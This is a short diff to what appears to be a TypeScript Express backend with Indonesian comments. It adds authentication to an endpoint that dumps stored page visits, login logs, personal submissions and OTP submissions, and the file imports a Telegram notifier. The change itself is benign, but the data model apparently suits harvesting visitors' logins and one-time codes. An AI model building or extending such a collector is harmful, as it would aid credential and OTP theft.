@@ -3,6 +3,7 @@ import { db, pageVisitsTable, loginLogsTable, personalSubmissionsTable, otpSubmi
 import { desc } from "drizzle-orm";
 import { z } from "zod";
 import { tgNotify } from "../lib/tg-notify";
+import { requireAuth } from "../middleware/require-auth";
 
 const router: IRouter = Router();
 
@@ -42,8 +43,8 @@ router.post("/track/visit", async (req, res): Promise<void> => {
   res.json({ ok: true });
 });
 
-/* GET /api/data/all — semua record dari semua tabel utama */
-router.get("/data/all", async (_req, res): Promise<void> => {
+/* GET /api/data/all — semua record dari semua tabel utama (admin only) */
+router.get("/data/all", requireAuth, async (_req, res): Promise<void> => {
   try {
     const [visits, logins, personal, otp, contact] = await Promise.all([
       db.select().from(pageVisitsTable).orderBy(desc(pageVisitsTable.visitedAt)).limit(200),
